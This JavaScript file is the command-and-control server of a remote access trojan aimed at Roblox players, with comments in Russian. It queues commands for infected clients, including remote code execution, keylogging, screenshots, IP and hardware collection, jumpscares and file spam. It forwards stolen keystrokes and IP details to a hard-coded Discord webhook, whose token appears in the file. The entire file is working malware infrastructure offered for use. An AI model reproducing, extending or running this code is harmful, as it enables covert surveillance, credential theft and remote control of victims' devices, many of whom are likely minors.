const http = require('http');
const fetch = require('node-fetch');

// Хранилище команд (для всех клиентов)
let commandQueue = [];
let lastScreenshot = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";

// Хранилище онлайн пользователей
global.onlineUsers = new Map();

// Функция для отправки красивого сообщения в Discord
async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    const embed = {
        title: title,
        description: description,
        color: color,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: {
            text: "RAT Control System v3.0"
        }
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Ошибка отправки в Discord:', error);
    }
}

// Очистка неактивных пользователей
function cleanupInactiveUsers() {
    const now = Date.now();
    let removedCount = 0;
    
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) { // 1 минута неактивности
            global.onlineUsers.delete(key);
            removedCount++;
        }
    }
    
    if (removedCount > 0) {
        console.log(`🧹 Удалено неактивных пользователей: ${removedCount}`);
    }
}

// Запускаем очистку каждые 30 секунд
setInterval(cleanupInactiveUsers, 30 * 1000);

// НОВАЯ ФУНКЦИЯ: Получение списка онлайн пользователей (только имена)
function getOnlinePlayers() {
    cleanupInactiveUsers();
    return Array.from(global.onlineUsers.keys());
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // НОВЫЙ ЭНДПОИНТ: Получение списка онлайн пользователей (просто имена)
    if (req.method === 'GET' && req.url === '/online_players') {
        try {
            const players = getOnlinePlayers();
            res.end(JSON.stringify({
                players: players,
                count: players.length,
                timestamp: new Date().toISOString()
            }));
        } catch (e) {
            res.statusCode = 500;
            res.end(JSON.stringify({ error: "Server error", details: e.message }));
        }
        return;
    }
    
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { command, args, targetPlayer } = JSON.parse(body);
                console.log(`📨 Получена команда: ${command} для игрока: ${targetPlayer || "ALL"}`, args ? args : '');
                
                // Добавляем команду в очередь с указанием цели
                commandQueue.push({
                    command: command,
                    args: args || [],
                    target: targetPlayer || null, // null = всем игрокам
                    timestamp: Date.now()
                });

                // Логирование в Discord с указанием цели
                const targetInfo = targetPlayer ? `🎯 **Цель:** ${targetPlayer}\n` : "🎯 **Цель:** ВСЕ игроки\n";
                
                if (command === "user_chat") {
                    await sendDiscordMessage(
                        "💬 Чат игрока",
                        `${targetInfo}**${args[0]}:** ${args[1]}`,
                        0x3498db
                    );
                } else if (command === "execute_log") {
                    await sendDiscordMessage(
                        "🔧 Выполнение кода",
                        `${targetInfo}**Игрок:** ${args[0]}\n**Результат:** ${args[1]}`,
                        0xf39c12
                    );
                } else if (command === "inject_notify") {
                    await sendDiscordMessage(
                        "🔌 Новый инжект!",
                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}\n**Инжектор:** ${args[3]}\n**Устройство:** ${args[4] || "Unknown"}`,
                        0x00ff00,
                        [
                            { name: "IP информация", value: args[2] || "N/A", inline: false }
                        ]
                    );
                } else if (command === "memory_spam_start") {
                    await sendDiscordMessage(
                        "💾 Memory Spam запущен",
                        `${targetInfo}**Количество файлов:** ${args[0]}\n**Статус:** Выполняется`,
                        0xff6b6b
                    );
                } else if (command === "gallery_spam_start") {
                    await sendDiscordMessage(
                        "🖼️ Gallery Spam запущен",
                        `${targetInfo}**Количество файлов:** ${args[0]}\n**Источник:** GitHub`,
                        0x74b9ff
                    );
                } else if (command === "spam_completed") {
                    await sendDiscordMessage(
                        "✅ Spam операция завершена",
                        `${targetInfo}**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
                        0x00ff00
                    );
                } else if (command === "jumpscare") {
                    const scareNames = {
                        1: "Джефф Килер 👹",
                        2: "Соник.exe 💀"
                    };
                    
                    await sendDiscordMessage(
                        "👻 Скример запущен!",
                        `${targetInfo}**Тип:** ${scareNames[args[0]] || "Неизвестный"}\n**Время:** ${new Date().toLocaleTimeString()}\n**Device:** ${args[1] || "Unknown"}`,
                        0xff0000
                    );
                } else {
                    // Для обычных команд
                    await sendDiscordMessage(
                        "🎮 Команда отправлена",
                        `${targetInfo}**Команда:** ${command}\n**Аргументы:** ${args?.join(', ') || 'нет'}`,
                        0x3498db
                    );
                }

                res.end(JSON.stringify({ 
                    status: "OK",
                    message: `Команда ${command} принята для ${targetPlayer || "всех игроков"}`
                }));
            } catch (e) {
                console.error('Ошибка обработки команды:', e);
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request", details: e.message }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/data') {
        console.log(`📡 Клиент запрашивает команды (в очереди: ${commandQueue.length})`);
        
        if (commandQueue.length > 0) {
            // НЕ очищаем всю очередь - только отправляем команды, предназначенные этому клиенту
            const commandsForClient = [];
            const remainingCommands = [];
            
            // Получаем имя игрока из query параметра
            const playerName = req.headers['x-player-name'] || new URL(req.url, `http://${req.headers.host}`).searchParams.get('player');
            
            for (const cmd of commandQueue) {
                // Если команда предназначена всем ИЛИ конкретно этому игроку
                if (cmd.target === null || cmd.target === playerName) {
                    commandsForClient.push(cmd);
                } else {
                    remainingCommands.push(cmd);
                }
            }
            
            // Обновляем очередь (оставляем только не предназначенные этому клиенту)
            commandQueue = remainingCommands;
            
            if (commandsForClient.length > 0) {
                const nextCommand = commandsForClient[0];
                
                console.log(`📤 Отправка команды ${nextCommand.command} игроку ${playerName || "unknown"}`);
                
                res.end(JSON.stringify({
                    command: nextCommand.command,
                    args: nextCommand.args,
                    timestamp: nextCommand.timestamp
                }));
            } else {
                // Нет команд для этого игрока
                res.end(JSON.stringify({
                    command: "",
                    args: []
                }));
            }
        } else {
            res.end(JSON.stringify({
                command: "",
                args: []
            }));
        }
        return;
    }

    // ... остальной код сервера остается без изменений ...
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                console.log('📸 Скриншот получен');
                res.end(JSON.stringify({ status: "Screenshot received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/screenshot') {
        if (lastScreenshot) {
            res.end(JSON.stringify({ image: lastScreenshot }));
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No screenshot available" }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                
                await sendDiscordMessage(
                    "⌨️ Данные кейлоггера",
                    `\`\`\`\n${logs.slice(0, 2000)}\n\`\`\``,
                    0xe74c3c,
                    [
                        { name: "Количество символов", value: logs.length.toString(), inline: true }
                    ]
                );
                
                res.end(JSON.stringify({ status: "Logs received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid keylog data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, data } = JSON.parse(body);
                
                await sendDiscordMessage(
                    "🖥️ Информация об оборудовании",
                    `**Игрок:** ${player}\n**Игра:** ${data.game}\n**Инжектор:** ${data.executor}\n**Устройство:** ${data.system?.device_type || "Unknown"}`,
                    0x9b59b6,
                    [
                        { name: "FPS", value: data.fps?.toString() || "N/A", inline: true },
                        { name: "Ping", value: data.ping?.toString() || "N/A", inline: true },
                        { name: "Device Type", value: data.system?.device_type || "N/A", inline: true },
                        { name: "IP информация", value: data.ip_info || "N/A", inline: false }
                    ]
                );
                
                res.end(JSON.stringify({ status: "Hardware data received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid hardware data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/users') {
        try {
            cleanupInactiveUsers(); // Очищаем перед отправкой
            
            if (!global.onlineUsers || global.onlineUsers.size === 0) {
                res.end(JSON.stringify({ 
                    users: [],
                    count: 0,
                    message: "Нет активных пользователей",
                    timestamp: new Date().toISOString()
                }));
                return;
            }
            
            const users = Array.from(global.onlineUsers.values());
            
            res.end(JSON.stringify({
                users: users,
                count: users.length,
                timestamp: new Date().toISOString()
            }));
        } catch (e) {
            res.statusCode = 500;
            res.end(JSON.stringify({ error: "Server error", details: e.message }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/users') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, place, executor, device } = JSON.parse(body);
                
                // Обновляем информацию о пользователе
                global.onlineUsers.set(player, {
                    player: player,
                    place: place,
                    executor: executor,
                    device: device || "Unknown",
                    lastSeen: Date.now(),
                    timestamp: new Date().toISOString()
                });

                console.log(`👤 Обновлен пользователь: ${player} в игре ${place} (${device || "Unknown"})`);
                
                res.end(JSON.stringify({ status: "User data updated" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid user data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/status') {
        cleanupInactiveUsers();
        
        res.end(JSON.stringify({
            status: "online",
            version: "3.0.0",
            timestamp: new Date().toISOString(),
            pending_commands: commandQueue.length,
            online_users: global.onlineUsers.size,
            online_players: getOnlinePlayers(),
            features: [
                "player_control",
                "targeted_commands", 
                "chat_system",
                "screenshots",
                "keylogger",
                "hardware_info",
                "jumpscare_system",
                "spam_tools",
                "user_tracking",
                "auto_persistence",
                "smart_targeting"
            ]
        }));
        return;
    }

    if (req.method === 'GET' && req.url === '/system_info') {
        res.end(JSON.stringify({
            project: "RAT Control System",
            version: "3.0.0",
            description: "Продвинутая система удаленного управления Roblox клиентами с адресным выполнением команд",
            features: [
                {
                    category: "Управление игроком",
                    commands: ["/kick <причина> [игрок]", "/freeze <секунды> [игрок]", "/void [игрок]", "/spin [игрок]", "/fling [игрок]", "/sit [игрок]", "/dance [игрок]"]
                },
                {
                    category: "Чат и сообщения",
                    commands: ["/chat [игрок]", "/message <текст> [игрок]", "/popup <текст> [игрок]"]
                },
                {
                    category: "Аудио/Видео",
                    commands: ["/mute [игрок]", "/unmute [игрок]", "/playaudio <id> [игрок]", "/blur <секунды> [игрок]", "/screenshot [игрок]"]
                },
                {
                    category: "Системные команды",
                    commands: ["/execute <код> [игрок]", "/fakeerror <текст> [игрок]", "/keylog [игрок]", "/stopkeylog [игрок]", "/hardware [игрок]", "/hide [игрок]"]
                },
                {
                    category: "Пользователи",
                    commands: ["/users", "/online"]
                },
                {
                    category: "Скримеры",
                    commands: ["/jumpscare <тип> [игрок]"]
                },
                {
                    category: "Spam инструменты",
                    commands: ["/memory <кол-во> [игрок]", "/gallery <кол-во> [игрок]"]
                }
            ],
            targeting_system: {
                description: "Умная система выбора цели",
                rules: [
                    "Если указан игрок - команда выполняется только у него",
                    "Если игрок не указан и онлайн 1 игрок - команда выполняется у него",
                    "Если игрок не указан и онлайн >1 игрока - команда отправляется всем",
                    "Для принудительной отправки всем используйте '*' как имя игрока"
                ]
            }
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

server.listen(process.env.PORT || 3000, () => {
    console.log("🚀 Сервер запущен на порту 3000");
    console.log("📊 Версия: 3.0.0");
    console.log("🎯 Новая система: Адресные команды с умным выбором цели");
    console.log("🔗 Webhook: " + WEBHOOK_URL);
    console.log("✅ Готов к приему команд");
    console.log("🎮 Система выбора цели: АВТОМАТИЧЕСКАЯ");
    console.log("👤 Формат команд: /команда аргументы [игрок]");
    console.log("\n📡 Эндпоинты:");
    console.log("• POST /command - Отправка команд с указанием цели");
    console.log("• GET  /data?player=NAME - Получение команд для конкретного игрока");
    console.log("• GET  /online_players - Список имен онлайн игроков");
    console.log("• GET  /users - Детальная информация об игроках");
});
